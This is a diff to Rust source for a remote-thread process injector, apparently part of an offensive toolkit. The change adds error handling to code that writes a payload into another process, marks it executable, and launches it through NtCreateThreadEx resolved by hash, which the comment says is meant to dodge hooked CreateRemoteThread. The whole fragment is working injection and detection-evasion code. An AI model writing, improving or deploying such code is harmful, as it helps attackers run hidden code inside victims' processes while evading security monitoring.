@@ -56,16 +56,28 @@ impl Injector for RemoteThreadInjector {
                 pe_resolve::close_handle(h_proc);
                 return Err(anyhow!("RemoteThread: WriteProcessMemory failed"));
             }
+            if written != payload.len() {
+                pe_resolve::close_handle(h_proc);
+                return Err(anyhow!(
+                    "RemoteThread: WriteProcessMemory wrote {} of {} bytes",
+                    written,
+                    payload.len()
+                ));
+            }
 
             // Switch to execute-read (no write)
             let mut old_prot = 0u32;
-            VirtualProtectEx(
+            if VirtualProtectEx(
                 h_proc,
                 remote_mem,
                 payload.len(),
                 PAGE_EXECUTE_READ,
                 &mut old_prot,
-            );
+            ) == 0
+            {
+                pe_resolve::close_handle(h_proc);
+                return Err(anyhow!("RemoteThread: VirtualProtectEx to RX failed"));
+            }
 
             // Use NtCreateThreadEx via pe_resolve to avoid the hooked CreateRemoteThread.
             let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
